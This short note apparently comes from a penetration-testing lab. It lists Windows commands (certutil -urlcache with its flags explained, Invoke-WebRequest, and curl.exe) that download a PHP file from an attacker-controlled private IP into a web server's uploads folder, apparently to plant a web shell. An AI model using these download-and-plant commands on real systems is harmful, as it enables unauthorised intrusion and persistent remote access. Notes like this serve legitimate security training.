certutil -urlcache -split -f [http://192.168.45.229/](http://192.168.45.229/wget.ps1)8.php

- certutil - A built-in Windows utility normally used for certificate management
- urlcache - Accesses the Windows URL cache
- split - Splits the URL components (separates the filename from the path)
- f - Forces overwrite if file exists

  

  

Invoke-WebRequest -Uri "[http://192.168.45.229/8.php](http://192.168.45.229/8.php)" -UseBasicParsing -OutFile "8.php"

  

  

PS C:\xampp\htdocs\uploads> where.exe curl  
C:\Windows\System32\curl.exe

curl.exe -o "8.php" "[http://192.168.45.229/8.php](http://192.168.45.229/8.php)"

curl -o "8.php" "[http://192.168.45.229/8.php](http://192.168.45.229/8.php)"